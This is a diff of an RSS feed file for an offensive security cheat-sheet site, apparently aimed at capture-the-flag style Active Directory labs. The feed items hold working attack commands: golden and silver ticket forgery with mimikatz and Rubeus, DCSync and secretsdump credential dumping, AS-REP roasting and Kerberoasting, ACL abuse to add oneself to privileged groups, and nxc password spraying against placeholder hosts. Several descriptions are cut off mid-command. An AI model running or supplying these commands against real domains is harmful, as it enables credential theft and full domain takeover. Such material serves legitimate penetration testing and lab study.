@@ -15,32 +15,46 @@
       <description>Privesc from DA to EA 1. Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4. Forge a golden ticket # Append &amp;#39;-519&amp;#39; to target domain SID ./mimikatz.exe &amp;#39;kerberos::golden /user:Administrator /rc4:&amp;lt;HASH&amp;gt; /domain:CURRENT.EXAMPLE.COM /sid:&amp;lt;CURRENT_DOMAIN_SID&amp;gt; /sids:&amp;lt;TARGET_DOMAIN_SID&amp;gt;-519 /ticket:c:\windows\tasks\ticket.kirbi&amp;#39; &amp;#39;exit&amp;#39; Note: May need to try different high value hashes</description>
     </item>
     <item>
+      <title>AddSelf</title>
+      <link>https://tldrbins.github.io/addself/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addself/</guid>
+      <description>AddSelf (From Linux) powerview.py powerview.py&#xA;# Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login to make changes first Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
+    </item>
+    <item>
       <title>Kerberoasting</title>
       <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/roasting/</guid>
-      <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos&#xA;Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password </description>
+      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 example.com/user Kerberoasting From Linux # Fix time skew sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;example.com/username:password&amp;#39; -dc-ip 10.10.11.10 Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s 10.</description>
     </item>
     <item>
       <title>Kerberos</title>
       <link>https://tldrbins.github.io/kerberos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kerberos/</guid>
-      <description>Kerbrute Download kerbrute&#xA;kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .</description>
+      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain example.com --dc 10.10.11.10 usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1 : Using impacket sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; example.com/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
     </item>
     <item>
       <title>LDAP</title>
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ldap/</guid>
-      <description>Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
+      <description>ldapsearch # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
+    </item>
+    <item>
+      <title>Machine Account</title>
+      <link>https://tldrbins.github.io/machine_account/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/machine_account/</guid>
+      <description> Abuse #1 : Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache&#xA;python3 rubeustoccache.py &amp;lt;base64_encoded_ticket&amp;gt; secrets.kirbi secrets.ccache 3. Dump Secrets export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator </description>
     </item>
     <item>
       <title>NetExec (nxc)</title>
       <link>https://tldrbins.github.io/nxc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nxc/</guid>
-      <description> nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ </description>
+      <description>nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
     </item>
     <item>
       <title>RPC</title>
@@ -54,7 +68,14 @@
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USERNAME&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+    </item>
+    <item>
+      <title>Silver Ticket</title>
+      <link>https://tldrbins.github.io/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/silver_ticket/</guid>
+      <description>From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:example.com /dc:dc.example.com /creduser:example.com\username /credpassword:password /nowrap 2. Generate NTLM .\rubeus.exe hash /password:password 3. Get domain SID Locally import-module activedirectory Get-ADDomain | fl DomainSID Remotely # Install ldp.exe (Windows 11) Settings &amp;gt; System &amp;gt; Optional Features &amp;gt; More Windows Features and add &amp;#39;Active Driectory Lightweight Directory Services&amp;#39; # Bind &amp;gt; Bind with credentials ldp.exe # Browse &amp;gt; Search BaseDN: DC=example,DC=com Filter: (objectclass=User) 4.</description>
     </item>
   </channel>
 </rss>
